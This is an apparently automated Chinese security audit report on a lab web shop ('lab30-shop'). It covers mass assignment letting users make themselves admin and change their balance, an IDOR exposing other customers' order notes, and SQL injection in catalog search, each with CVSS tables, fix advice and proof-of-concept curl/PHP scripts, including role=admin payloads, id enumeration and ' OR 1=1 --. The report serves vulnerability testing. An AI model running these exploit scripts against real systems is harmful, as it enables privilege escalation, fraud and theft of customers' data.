# 宿主阶段审计报告

运行：`1287aed9e8cb4ed28ed7fcc8bd8cb91b`
状态：inconclusive；完整性：未完成
停止原因：一次修复规划后阻塞原因仍未改变，停止重复规划。

运行发现原始记录：52；当前有效记录：48；按台账身份分组：30

## 当前有效发现

### 台账 `0fee004aaf334840989e82b5a3a2a1f0`

- account/update.php 批量赋值允许普通用户改写 role 与 balance（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N，验证：verified）
  来源 `2530904dc3904897b8fca25b4cc2bff0` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/account/update.php', 'start_line': 2, 'end_line': 7}]
  结论：update.php 第4行把白名单列包含 role、balance、tier，第5行遍历任意 $_POST 键值匹配后写入 UPDATE，第6行仅以自身 id 作 WHERE 条件，未限制为低权限字段。登录普通用户提交 role=admin&balance=999999 即可提权与篡改余额；CSRF 保护存在但不阻止越权字段写入。
  输入：已登录用户提交的 POST 参数 role/balance/tier
  传播：$_POST -> in_array 列白名单 -> SET 子句拼接 -> UPDATE users WHERE id=自身
  危险操作：UPDATE users SET role=?,balance=? 等敏感字段
  保护：check_csrf 仅防 CSRF，无字段级权限校验
  修复建议：用户自助更新只允许 display_name/email/nickname/homepage 等非敏感列；role/balance/tier 需服务端授权流程并二次校验。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:56:53.758450+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | Web 端 POST 可直达 | lab30-shop/app/public/account/update.php:3-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 仅需提交额外字段名 role/balance | lab30-shop/app/public/account/update.php:4-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需已登录的普通 customer 账号 | lab30-shop/app/public/account/update.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自身操作 | lab30-shop/app/public/account/update.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 仍在本应用内 | lab30-shop/app/public/account/update.php:4-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | N | 仅写入自身记录 | lab30-shop/app/public/account/update.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 可自行把 role 设为 admin、balance 任意改写 | lab30-shop/app/public/account/update.php:4-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无可用性影响证据 | lab30-shop/app/public/account/update.php:4-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'mass_assign_role.php', 'language': 'php', 'script': "<?php\n$c=curl_init('http://TARGET/account/update.php');\ncurl_setopt_array($c,[CURLOPT_COOKIE=>'SHOPSESSID=VICTIM_SESSION',CURLOPT_POST=>1,CURLOPT_POSTFIELDS=>'csrf=TOKEN&role=admin&balance=999999',CURLOPT_RETURNTRANSFER=>1]);\nvar_dump(curl_exec($c));", 'instructions': '以普通已登录用户（customer）会话从 /account/index.php 取 csrf token，向 /account/update.php 提交 role=admin&balance=999999。', 'normal_input': 'csrf=TOKEN&display_name=test', 'attack_input': 'csrf=TOKEN&role=admin&balance=999999', 'expected_result': '响应中返回的 user 对象 role=admin、balance=999999，导航出现运营工作台入口。'}
````

- 会员资料更新存在批量赋值，普通用户可将 role 改为 admin 并修改余额（CVSS 3.1 Base 7.1 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N，验证：verified）
  来源 `3fa64df23b264c32ac38e5a83feb9374` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/account/update.php', 'start_line': 2, 'end_line': 6}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 20, 'end_line': 25}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 37}, {'path': 'lab30-shop/app/public/partner/token.php', 'start_line': 3, 'end_line': 5}]
  结论：account/update.php 第4-6行以 columns=['display_name','email','role','balance','tier','nickname','homepage'] 白名单方式遍历所有 $_POST 键拼接 UPDATE users 语句，但该白名单包含 role、balance、tier 等权限/资金字段。任意登录会员（require_user 仅校验登录，无角色限制）只要在表单中附加 role=admin 或 balance=999999，即可修改自身角色为管理员或篡改余额，进而访问 /ops/users.php 等管理功能，构成越权提升。
  输入：POST 参数 role/balance/tier 等，普通登录会员可控
  传播：update.php:5 foreach($_POST) 命中 columns -> $set[]='`role`=?' 等 -> update.php:6 UPDATE users SET role=?,balance=? WHERE id=? -> 用户会话中 user() 从 users 表读取 role，即获得 admin
  危险操作：更新 users 表 role/balance 字段，授予管理员权限或篡改资金
  保护：require_user() 仅要求登录；check_csrf 存在但攻击者可用自身 token；columns 允许 role/balance/tier，无按级别的字段过滤
  前提：['攻击者拥有普通会员账号并登录，能读取自身会话 csrf token']
  修复建议：仅允许修改普通字段（display_name/nickname/homepage）；role/balance/tier 必须由管理员专用端点并做角色校验，禁止客户端提交。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:00:24.703137+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | Web 入口远程可利用 | lab30-shop/app/public/account/update.php:3-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 只需在 POST 中增加一个字段 | lab30-shop/app/public/account/update.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需普通会员会话 | lab30-shop/app/public/account/update.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自行操作 | lab30-shop/app/public/account/update.php:4-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同一用户上下文内改变自身权限 | lab30-shop/app/public/account/update.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | L | 可读取管理员功能数据 | lab30-shop/app/public/ops/users.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 可修改自身角色与余额，并关联运营后台写入操作 | lab30-shop/app/public/account/update.php:4-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无直接破坏服务可用性 | lab30-shop/app/public/account/update.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'poc_mass_assignment.sh', 'language': 'bash', 'script': "curl -s -b SHOPSESSID=<session> -X POST 'http://target/account/update.php' --data 'csrf=<token>&display_name=t&role=admin&balance=999999'", 'instructions': '登录普通会员取得 cookie 与 csrf，向 /account/update.php POST 增加 role=admin 与 balance=999999，随后访问 /ops/users.php 验证。', 'normal_input': 'display_name=t', 'attack_input': 'display_name=t&role=admin&balance=999999', 'expected_result': '普通输入角色仍为 member；攻击输入后 user() 返回 role=admin，可访问 admin 专属的 /ops/users.php'}
````

- account/update.php 批量赋值白名单含 role/balance/tier，普通用户可提权改余额（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N，验证：verified）
  来源 `13bfb1ef96bb435192b91987d1c97026` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/account/update.php', 'start_line': 2, 'end_line': 7}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 37}, {'path': 'lab30-shop/app/src/setup.php', 'start_line': 16, 'end_line': 17}]
  结论：update.php 仅 require_user()，POST 时键在 ['display_name','email','role','balance','tier','nickname','homepage'] 内均拼入 UPDATE users SET ... WHERE id=当前用户。普通 customer 提交 role=admin 或 balance=99999 即改自身角色与余额。
  输入：POST 字段 role/balance/tier
  传播：foreach($_POST) -> in_array 白名单 -> UPDATE users SET ... WHERE id=$u['id']
  危险操作：UPDATE 修改 role/balance/tier
  保护：check_csrf 只防 CSRF；无角色限制且白名单含敏感列
  前提：['任意登录账户与有效 CSRF token']
  修复建议：移除 role/balance/tier，仅允许非敏感列。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:03:06.746245+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 表单 | lab30-shop/app/public/account/update.php:3-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 直接提交 | lab30-shop/app/public/account/update.php:4-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 普通登录即可 | lab30-shop/app/public/account/update.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无 | lab30-shop/app/public/account/update.php:3-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同应用内提权 | lab30-shop/app/public/account/update.php:4-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | N | 主要改数据 | lab30-shop/app/public/account/update.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 可改 role/balance/tier | lab30-shop/app/public/account/update.php:4-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无 | lab30-shop/app/public/account/update.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'mass_assign_update.sh', 'language': 'bash', 'script': 'token=$(curl -s -b jar http://TARGET/account/update.php | grep -o \'value="[0-9a-f]*"\' | head -1 | sed \'s/value="//;s/"//\'); curl -s -b jar -H \'Accept: application/json\' http://TARGET/account/update.php -d "csrf=$token&role=admin&balance=99999"', 'instructions': '登录普通账户抓 csrf 后提交 role/balance。', 'normal_input': 'display_name=林晓', 'attack_input': 'role=admin&balance=99999', 'expected_result': '返回 JSON role=admin、balance=99999'}
````

- 账户资料更新批量赋值，登录用户可自改 role/balance/tier 提权并篡改余额（CVSS 3.1 Base 8.1 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N，验证：verified）
  来源 `6eb7044e83ba483eb87260003dff2d19` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/account/update.php', 'start_line': 2, 'end_line': 8}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 37}]
  结论：update.php 的列白名单含 role、balance、tier 敏感字段，把任意 POST 中匹配列名的值拼进 UPDATE users SET ... WHERE id=?；require_user() 仅要求登录不做角色限制，任意 customer 提交 role=admin/balance=999999 即被持久化，构成自我提权与资金篡改。
  输入：普通登录用户 POST 的 role/balance/tier 字段
  传播：第4行列白名单 -> 第5行 foreach($_POST) 收集 -> 第6行 implode 拼入 UPDATE users SET ... WHERE id=$u['id']
  危险操作：db()->prepare('UPDATE users SET '.implode(',',$set).' WHERE id=?')->execute($values)
  保护：仅 check_csrf 防跨站，不防本人伪造字段；白名单未排除敏感列，无权限判断
  前提：['攻击者持有任意合法账号并可取得自身 csrf token']
  修复建议：只允许 display_name/email/nickname/homepage 更新，敏感列走带权限校验接口。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:07:15.706212+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | Web 表单远程触发 | lab30-shop/app/public/account/update.php:3-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 仅需额外字段 | lab30-shop/app/public/account/update.php:4-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需已登录 | lab30-shop/app/src/bootstrap.php:33-34 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 改自身记录 | lab30-shop/app/public/account/update.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同应用授权域 | lab30-shop/app/public/account/update.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可变更读取敏感字段 | lab30-shop/app/public/account/update.php:5-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | role/balance/tier 被改写 | lab30-shop/app/public/account/update.php:4-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无可用性影响 | lab30-shop/app/public/account/update.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'mass_assignment_update.sh', 'language': 'bash', 'script': 'curl -s -c cj -b cj -d \'username=alice&password=Alice123!\' http://target/auth/login.php\ncsrf=$(curl -s -c cj -b cj http://target/account/update.php | grep -o \'name="csrf" value="[^"]*\' | cut -d\'"\' -f4)\ncurl -s -b cj -H \'Accept: application/json\' -d "csrf=$csrf&role=admin&balance=999999&tier=gold" http://target/account/update.php', 'instructions': '用普通账号登录获取会话与 csrf，POST /account/update.php 附加 role/balance/tier，返回的用户对象显示被改后的角色与余额。', 'normal_input': 'csrf=<token>&display_name=Alice', 'attack_input': 'csrf=<token>&role=admin&balance=999999&tier=gold', 'expected_result': '基线仅更新显示名；攻击后 role=admin、balance=999999'}
````


### 台账 `4e35ce72f856430faf590095346c382a`

- orders/detail.php 缺少订单归属校验导致 IDOR 泄露他人订单私密备注（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N，验证：verified）
  来源 `e7a5a354d5314a46b46fc6c07b6777fe` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/orders/detail.php', 'start_line': 2, 'end_line': 4}, {'path': 'lab30-shop/app/src/setup.php', 'start_line': 20, 'end_line': 22}]
  结论：require_user() 只要求登录，第2行 SELECT 以 o.id=$_GET['id'] 查询，未附加 user_id=$u['id'] 条件；第3行 JSON 分支与第4行页面分支都直接输出 private_note、username。任意登录用户枚举 id 即读取他人订单私密数据。
  输入：GET 参数 id
  传播：$_GET['id'] -> WHERE o.id=? -> fetch -> json_response/页面输出 private_note
  危险操作：返回他人订单明细与私密配送备注
  保护：仅 require_user() 登录检查，无归属过滤
  修复建议：查询条件加 AND o.user_id=? 并绑定当前用户 id（运营角色另行授权）。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:56:53.759656+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 请求可达 | lab30-shop/app/public/orders/detail.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 顺序 id 直接枚举 | lab30-shop/app/public/orders/detail.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需登录但任意账号即可 | lab30-shop/app/public/orders/detail.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无需交互 | lab30-shop/app/public/orders/detail.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同一应用内跨用户 | lab30-shop/app/public/orders/detail.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 返回完整订单含 private_note 与他人用户名 | lab30-shop/app/public/orders/detail.php:2-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 只读 | lab30-shop/app/public/orders/detail.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无 | lab30-shop/app/public/orders/detail.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'idor_order_detail.php', 'language': 'php', 'script': "<?php\n$c=curl_init('http://TARGET/orders/detail.php?id=2');\ncurl_setopt_array($c,[CURLOPT_COOKIE=>'SHOPSESSID=BOB_SESSION',CURLOPT_HTTPHEADER=>['Accept: application/json'],CURLOPT_RETURNTRANSFER=>1]);\necho curl_exec($c);", 'instructions': '用 bob 的会话请求 /orders/detail.php?id=1（alice 的订单），Accept: application/json。', 'normal_input': '/orders/detail.php?id=2 (本人订单)', 'attack_input': '/orders/detail.php?id=1', 'expected_result': '攻击请求返回 alice 的 order_no 与 private_note=ALICE_PRIVATE_ORDER_delivery_morning；控制请求返回 bob 自己的订单。'}
````

- orders/detail.php 缺少归属校验，任意登录用户可读取他人订单 private_note（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N，验证：verified）
  来源 `348afba673634b92959d48a15cd66245` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/orders/detail.php', 'start_line': 2, 'end_line': 4}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 20, 'end_line': 37}, {'path': 'lab30-shop/app/src/setup.php', 'start_line': 20, 'end_line': 22}]
  结论：orders/detail.php 仅 require_user() 后按 $_GET['id'] 查询 orders，未附加 user_id 约束；第3行 JSON 与第4行页面都返回 private_note，任意登录用户可遍历 id 读取他人订单与配送备注。
  输入：GET 参数 id
  传播：$_GET['id'] -> execute -> $o -> json_response / h($o['private_note'])
  危险操作：跨用户读取 orders 私密字段
  保护：仅登录检查，无归属比对
  前提：['任意有效登录会话']
  修复建议：查询加 AND o.user_id=? 绑定当前用户。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:03:06.745085+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 入口 | lab30-shop/app/public/orders/detail.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 遍历递增 id | lab30-shop/app/public/orders/detail.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需普通登录 | lab30-shop/app/src/bootstrap.php:33-36 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无他人交互 | lab30-shop/app/public/orders/detail.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同应用内 | lab30-shop/app/public/orders/detail.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 泄露他人私有备注 | lab30-shop/app/public/orders/detail.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 只读 | lab30-shop/app/public/orders/detail.php:2-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无 | lab30-shop/app/public/orders/detail.php:2-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'idor_order_detail.sh', 'language': 'bash', 'script': 'for i in 1 2 3 4; do curl -s -b jar -H \'Accept: application/json\' "http://TARGET/orders/detail.php?id=$i"; echo; done', 'instructions': '以 alice 登录取 cookie jar，再以 JSON Accept 请求各订单 id。', 'normal_input': 'GET /orders/detail.php?id=1', 'attack_input': 'GET /orders/detail.php?id=2', 'expected_result': '攻击请求返回 bob 订单，含 private_note=BOB_PRIVATE_ORDER_gift_for_family'}
````

- 订单详情页缺乏归属校验，登录用户可越权读取他人订单及私有备注（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N，验证：verified）
  来源 `28dc3884860841f9a42ae16f07bf6b93` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/orders/detail.php', 'start_line': 2, 'end_line': 4}, {'path': 'lab30-shop/app/src/setup.php', 'start_line': 20, 'end_line': 23}, {'path': 'lab30-shop/app/public/orders/index.php', 'start_line': 2, 'end_line': 3}]
  结论：detail.php 仅 require_user() 后用 $_GET['id'] 查询订单，SQL 无 user_id 条件也不比较归属；渲染输出 private_note、购买人等信息，登录用户遍历 id 即可读取他人订单（种子含 ALICE/BOB 私有备注）。
  输入：GET 参数 id
  传播：第2行 $_GET['id'] -> WHERE o.id=? -> 第4行回显 private_note/username
  危险操作：按客户端 id 查询并输出他人订单私有字段
  保护：require_user 仅校验登录；无 user_id 归属判断
  前提：['攻击者持任意登录账号并知道/枚举订单 id']
  修复建议：查询加 AND o.user_id=? 绑定当前用户。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:07:15.707170+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 远程 | lab30-shop/app/public/orders/detail.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | id 自增易枚举 | lab30-shop/app/src/setup.php:20-22 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需登录 | lab30-shop/app/public/orders/detail.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无他人交互 | lab30-shop/app/public/orders/detail.php:2-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同应用内越权 | lab30-shop/app/public/orders/detail.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 泄露订单号/购买人/私有备注 | lab30-shop/app/public/orders/detail.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 只读 | lab30-shop/app/public/orders/detail.php:2-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无可用性影响 | lab30-shop/app/public/orders/detail.php:2-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'idor_order_detail.sh', 'language': 'bash', 'script': "curl -s -c cj -b cj -d 'username=alice&password=Alice123!' http://target/auth/login.php\ncurl -s -b cj -H 'Accept: application/json' 'http://target/orders/detail.php?id=2'", 'instructions': '以 alice 登录后请求他人订单 id=2。', 'normal_input': 'http://target/orders/detail.php?id=1（本人订单）', 'attack_input': 'http://target/orders/detail.php?id=2（bob 订单）', 'expected_result': '基线返回本人订单；攻击返回 username=bob 及 BOB_PRIVATE_ORDER_gift_for_family'}
````


### 台账 `8debae5d87fd4214ae3f767e062b4426`

- 商品搜索 q 参数未参数化导致 SQL 注入（CVSS 3.1 Base 9.4 (critical) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L，验证：inconclusive）
  来源 `2d51210ac2c247a18eaa1d233d2e302d` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/catalog/index.php', 'start_line': 3, 'end_line': 5}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 4, 'end_line': 8}]
  结论：catalog/index.php 第3行读取 $_GET['q'] 并强转为字符串，第4行直接将其拼入 SQL 字符串 "SELECT ... WHERE name LIKE '%".$term."%'" 后调用 db()->query()，未使用 PDO prepare/绑定参数。攻击者可构造引号闭合注入任意 SQL，读取或篡改商品及关联数据。
  输入：GET 参数 q
  传播：$_GET['q'] -> (string) -> 字符串拼接进 SQL -> db()->query()
  危险操作：PDO::query 执行拼接后的 SQL
  保护：bootstrap.php:6 虽设置 ATTR_EMULATE_PREPARES=false，但此处完全未使用 prepare/绑定，防护不适用
  前提：['无需登录，公开可访问 /catalog/index.php?q=...']
  修复建议：改用 prepare 并绑定 LIKE 参数，例如 '... LIKE ?' 绑定 '%'.$term.'%'。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:58:53.845300+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 公开 Web 入口 | lab30-shop/app/public/catalog/index.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 简单引号闭合即可注入 | lab30-shop/app/public/catalog/index.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | N | 无需认证 | lab30-shop/app/public/catalog/index.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无其他用户参与 | lab30-shop/app/public/catalog/index.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 仍在同一应用 DB 上下文 | lab30-shop/app/src/bootstrap.php:4-8 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可读全库数据 | lab30-shop/app/public/catalog/index.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 注入语句可修改数据 | lab30-shop/app/public/catalog/index.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | L | 可能影响查询可用性 | lab30-shop/app/public/catalog/index.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'sqli_catalog_poc.sh', 'language': 'bash', 'script': 'curl -s -G \'http://TARGET/catalog/index.php\' --data-urlencode "q=\' OR 1=1 -- "', 'instructions': '将 TARGET 替换为部署地址，请求后观察返回全部商品（包括原本不匹配搜索词的记录）。', 'normal_input': 'q=shirt', 'attack_input': "q=' OR 1=1 -- ", 'expected_result': '攻击输入使查询恒真并返回所有商品；正常输入只返回匹配商品。'}
````

- 商品目录搜索参数 q 直接拼接导致 SQL 注入（CVSS 3.1 Base 8.6 (high) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L，验证：inconclusive）
  来源 `5b3862889d1440b3b60455f297dc9ae8` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/catalog/index.php', 'start_line': 2, 'end_line': 4}]
  结论：catalog/index.php 第3行从 $_GET['q'] 取外部输入，第4行直接以字符串拼接构造 SQL 并 db()->query 执行，无可变参数绑定或转义，攻击者可通过闭合 LIKE 引号注入任意 SQL。
  输入：GET 参数 q
  传播：$term -> 字符串拼接 -> db()->query()
  危险操作：db()->query("SELECT ... WHERE name LIKE '%".$term."%' ...")
  保护：无预处理/参数绑定；bootstrap h() 仅用于 HTML 输出，不防护 SQL。
  前提：['公开目录页可访问，无需登录。']
  修复建议：使用 PDO 预处理和绑定参数，如 WHERE name LIKE :term，并传入 '%'.$term.'%' 作为参数。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:01:05.210202+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | PHP Web 入口可远程访问 | lab30-shop/app/public/catalog/index.php:1-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 构造 LIKE 闭合字符串即可注入 | lab30-shop/app/public/catalog/index.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | N | 无 require_user，公开访问 | lab30-shop/app/public/catalog/index.php:2-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无需他人交互 | lab30-shop/app/public/catalog/index.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 注入仅影响查询数据 | lab30-shop/app/public/catalog/index.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可读取任意表数据 | lab30-shop/app/public/catalog/index.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
